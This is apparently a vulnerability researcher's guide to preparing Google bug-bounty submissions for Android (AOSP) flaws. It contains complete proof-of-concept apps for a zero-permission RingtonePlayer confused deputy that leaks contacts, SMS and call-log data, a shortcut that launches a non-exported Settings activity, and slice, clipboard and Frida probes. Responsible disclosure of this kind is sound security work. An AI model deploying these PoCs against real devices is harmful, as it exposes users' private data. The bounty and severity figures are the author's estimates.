# AOSP Variant PoC & Exploitation Guide v2

> 新增发现 (V-18 ~ V-32) 的 PoC 和提交指南
> 2026-04-28

---

## V-18+V-19: RingtonePlayer Confused Deputy (推荐最先提交)

### VRP 评估: CVSS 7.1 (High) | $5k-$10k + $3k PoC bonus

| 维度 | 评估 |
|------|------|
| Privileges Required | **None** (零权限) |
| User Interaction | **None** (安装后自动触发) |
| Scope | **Changed** (利用 SystemUI 权限访问其他 app 数据) |
| Impact | Confidentiality (数据泄露) |

### 获取 IRingtonePlayer Binder

```java
// 方法 1: 反射 (最可靠)
AudioManager am = getSystemService(AudioManager.class);
Method getMethod = AudioManager.class.getDeclaredMethod("getRingtonePlayer");
getMethod.setAccessible(true);
IRingtonePlayer player = (IRingtonePlayer) getMethod.invoke(am);

// 方法 2: 通过 ServiceManager (需要 hidden API 绕过)
IBinder b = ServiceManager.getService(Context.AUDIO_SERVICE);
IAudioService audioService = IAudioService.Stub.asInterface(b);
IRingtonePlayer player = audioService.getRingtonePlayer();
```

### PoC App — 完整代码

**AndroidManifest.xml** (不需要任何权限):
```xml
<manifest package="com.poc.ringtoneplayer">
    <application android:label="RingtonePlayerPoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**MainActivity.java**:
```java
package com.poc.ringtoneplayer;

import android.app.Activity;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.IRingtonePlayer;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import java.lang.reflect.Method;

public class MainActivity extends Activity {
    private static final String TAG = "RingtonePlayerPoC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        new Thread(() -> {
            try {
                testConfusedDeputy();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }

    private void testConfusedDeputy() throws Exception {
        AudioManager am = getSystemService(AudioManager.class);
        
        // 获取 IRingtonePlayer binder
        Method getMethod = AudioManager.class.getDeclaredMethod("getRingtonePlayer");
        getMethod.setAccessible(true);
        Object player = getMethod.invoke(am);
        
        if (player == null) {
            Log.e(TAG, "Failed to get IRingtonePlayer");
            return;
        }

        // === Test 1: getTitle() 信息泄露 ===
        
        // 联系人 (需要 READ_CONTACTS — 我们没有)
        Uri contactsUri = Uri.parse("content://com.android.contacts/contacts");
        testGetTitle(player, "Contacts", contactsUri);
        
        // CallLog (需要 READ_CALL_LOG)
        Uri callLogUri = Uri.parse("content://call_log/calls/1");
        testGetTitle(player, "CallLog", callLogUri);
        
        // 媒体文件
        Uri mediaUri = Uri.parse("content://media/external/audio/media/1");
        testGetTitle(player, "Media", mediaUri);
        
        // SMS (需要 READ_SMS)
        Uri smsUri = Uri.parse("content://sms/inbox/1");
        testGetTitle(player, "SMS", smsUri);

        // === Test 2: play() URI 访问 ===
        
        // 尝试打开受保护的 URI — SystemUI 会尝试以系统权限打开
        AudioAttributes attrs = new AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                .build();
        
        try {
            Method playMethod = player.getClass().getMethod("play",
                    AudioAttributes.class, Uri.class, float.class, boolean.class);
            playMethod.invoke(player, attrs, contactsUri, 0.0f, false);
            Log.d(TAG, "[VULN] play() accepted contacts URI without permission!");
        } catch (Exception e) {
            if (e.getCause() instanceof SecurityException) {
                Log.d(TAG, "[SAFE] play() blocked: " + e.getCause().getMessage());
            } else {
                // 非 SecurityException = URI 已被系统成功打开
                Log.d(TAG, "[VULN] play() opened URI (exception: " + 
                    e.getClass().getSimpleName() + ")");
            }
        }
    }
    
    private void testGetTitle(Object player, String label, Uri uri) {
        try {
            Method getTitleMethod = player.getClass().getMethod("getTitle", Uri.class);
            String title = (String) getTitleMethod.invoke(player, uri);
            Log.d(TAG, "[VULN] " + label + " title = '" + title + "'");
        } catch (Exception e) {
            if (e.getCause() instanceof SecurityException) {
                Log.d(TAG, "[SAFE] " + label + ": " + e.getCause().getMessage());
            } else {
                Log.d(TAG, "[INFO] " + label + ": " + e.getClass().getSimpleName() 
                    + " — " + e.getMessage());
            }
        }
    }
}
```

### 验证步骤
```bash
# 1. 编译安装
adb install -r app-debug.apk

# 2. 运行并查看日志
adb logcat -s RingtonePlayerPoC:D

# 预期输出:
# [VULN] Contacts title = 'John Doe'    ← 泄露联系人信息
# [VULN] Media title = 'song.mp3'       ← 泄露媒体文件名
# [VULN] play() accepted contacts URI    ← 打开受保护 URI
```

### 提交模板
```
Title: IRingtonePlayer confused deputy — arbitrary URI access/metadata leak via SystemUI

Severity: High (EoP + ID)
Affected: Android 13, 14, 15 (all versions with RingtonePlayer)
Tested on: Pixel 8, Android 15, YYYY-MM-DD patch level

Summary:
The IRingtonePlayer Binder interface in SystemUI exposes play() and getTitle()
methods that accept arbitrary content URIs. These methods are callable by any
app without permissions via AudioManager.getRingtonePlayer(). Since SystemUI
holds READ_EXTERNAL_STORAGE, READ_CONTACTS, and other system privileges,
a zero-permission app can:

1. Leak metadata (titles) from contacts, SMS, call logs, and media files
   via getTitle()
2. Trigger SystemUI to open and process arbitrary content URIs via play()

Root cause: packages/SystemUI/src/com/android/systemui/media/RingtonePlayer.java
  - play(): No checkUriPermission() before creating Ringtone
  - getTitle(): No caller validation before resolving URI metadata

Suggested fix: Add Binder.getCallingUid() permission check using
  checkUriPermission() before URI operations, similar to CVE-2025-22420 fix.
```

---

## V-20: ShortcutService Intent Target Not Validated

### VRP 评估: CVSS 7.5 (High) | $5k-$15k

### PoC App

**AndroidManifest.xml**:
```xml
<manifest package="com.poc.shortcuthijack">
    <application android:label="ShortcutHijackPoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**MainActivity.java**:
```java
package com.poc.shortcuthijack;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ShortcutInfo;
import android.content.pm.ShortcutManager;
import android.graphics.drawable.Icon;
import android.os.Bundle;
import android.util.Log;
import java.util.Arrays;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        ShortcutManager sm = getSystemService(ShortcutManager.class);
        
        // 构造指向 Settings 非导出 Activity 的 Intent
        Intent targetIntent = new Intent();
        targetIntent.setComponent(new ComponentName(
            "com.android.settings",
            "com.android.settings.password.ChooseLockGeneric"
            // 或其他非导出但敏感的 Settings Activity
        ));
        targetIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        
        ShortcutInfo shortcut = new ShortcutInfo.Builder(this, "poc-shortcut")
            .setShortLabel("Settings PoC")
            .setLongLabel("Launch non-exported Settings activity")
            .setIcon(Icon.createWithResource(this, android.R.drawable.ic_menu_preferences))
            .setIntent(targetIntent)
            .build();
        
        try {
            sm.setDynamicShortcuts(Arrays.asList(shortcut));
            Log.d("PoC", "[INFO] Shortcut published! Long-press app icon to see it.");
            Log.d("PoC", "[INFO] Clicking the shortcut should launch non-exported activity");
        } catch (Exception e) {
            Log.e("PoC", "Failed: " + e.getMessage());
        }
    }
}
```

### 验证步骤
```bash
# 1. 安装
adb install -r app-debug.apk

# 2. 运行 app (发布 shortcut)
adb shell am start -n com.poc.shortcuthijack/.MainActivity

# 3. 长按 app 图标，看到 "Settings PoC" shortcut

# 4. 点击 shortcut
# 预期: Settings 的非导出 Activity 被 Launcher 以系统权限启动

# 5. 验证
adb logcat -s ActivityTaskManager:I | grep ChooseLockGeneric
```

### 注意事项
- 取决于 Launcher 实现是否以提升权限启动 shortcut Intent
- Pixel Launcher 与 AOSP Launcher3 行为可能不同
- 如果 Launcher 不传播权限，降级为 Medium

---

## V-21: SliceManagerService 过度 URI 授权

### VRP 评估: CVSS 6.5 (Medium-High) | $3k-$7.5k

### PoC 思路

```java
// 1. 请求访问一个特定 slice
SliceManager sm = getSystemService(SliceManager.class);
Uri specificSlice = Uri.parse("content://com.target.app/slice/settings");

// 2. 用户授予该特定 slice 的访问权限

// 3. 实际上获得了 com.target.app 整个 authority 下所有 slice 的访问
// 因为 grantPermissionFromUser() 清空了 path:
//   Uri grantUri = uri.buildUpon().path("").build();
//   → content://com.target.app/

Uri otherSlice = Uri.parse("content://com.target.app/slice/private_data");
Slice leaked = sm.bindSlice(otherSlice, SliceSpec.BASIC);
// 应该被拒绝，但实际上可以访问
```

---

## V-22: MediaSession BAL/FGS 传播

### 验证方法

```java
// 需要确认 tempAllowlistTargetPkgIfPossible 是否仍在使用
// 1. 创建 MediaSession
MediaSession session = new MediaSession(context, "PoC");
session.setCallback(new MediaSession.Callback() {
    @Override
    public void onPlay() {
        // 此回调被分发时，目标 app 可能获得 FGS 启动权限
    }
});
session.setActive(true);

// 2. 另一个 app 作为 MediaBrowser 连接
// 3. 观察 FGS 权限是否被传播
```

### Frida 验证
```javascript
Java.perform(function() {
    var MediaSessionService = Java.use(
        "com.android.server.media.MediaSessionService");
    MediaSessionService.tempAllowlistTargetPkgIfPossible.implementation = 
        function(targetUid, targetPkg, callingPid, callingUid, callingPkg, reason) {
            console.log("[MediaSession] tempAllowlist: " + callingPkg + 
                " → " + targetPkg + " (reason: " + reason + ")");
            return this.tempAllowlistTargetPkgIfPossible(
                targetUid, targetPkg, callingPid, callingUid, callingPkg, reason);
        };
});
```

---

## V-25: ClipboardService DoS

### PoC

```java
// 前提: 另一个 app 复制了包含受限 URI 的内容到剪贴板
// 例如: content://com.android.providers.downloads/all_downloads/123

// 恶意 app 读取剪贴板触发 SecurityException → 剪贴板被清空
ClipboardManager cm = getSystemService(ClipboardManager.class);
try {
    ClipData clip = cm.getPrimaryClip();
    // 如果剪贴板包含受限 URI，getPrimaryClip 内部的
    // addActiveOwnerLocked 触发 SecurityException
    // → setPrimaryClipInternalLocked(null, ...) → 剪贴板清空
} catch (Exception e) {
    Log.d("PoC", "Clipboard cleared! " + e.getMessage());
}
```

---

## 最终提交优先级排序

| 顺序 | 漏洞 | 理由 | 行动 |
|------|------|------|------|
| **1** | V-18+V-19 RingtonePlayer | 最干净: 零权限, 5分钟PoC, 两个入口点 | **立即提交** |
| **2** | V-3 AudioService | 同为 confused deputy, 独立服务 | **立即提交** |
| **3** | V-20 ShortcutService | 需要 Pixel 设备验证 Launcher 行为 | 验证后提交 |
| **4** | V-8 PackageArchiver | 最高赏金, 需确认利用链 | 研究中 |
| **5** | V-2 DPMS BAL | 需 Device Admin 前置 | 验证后提交 |
| **6** | V-22 MediaSession | 需确认是否被 CVE 覆盖 | 验证后提交 |
| **7** | V-13 WifiDisplay MAC | 简单 PoC, 中等赏金 | 并行提交 |
| **8** | V-21 SliceManager | 需要 slice-aware app 配合 | 验证后提交 |
| **9** | V-27 TvInput parental | 简单 PoC, 低赏金但确定 | 并行提交 |
| **10** | V-25 Clipboard DoS | 需要特定剪贴板状态 | 低优先 |

### Google Bug Hunters 提交地址
**https://bughunters.google.com/report/vrp** → Android → AOSP

---

*Guide v2 generated: 2026-04-28*
*总计 10 个可行动候选, 预估 Tier 1 赏金 $50k-$110k*
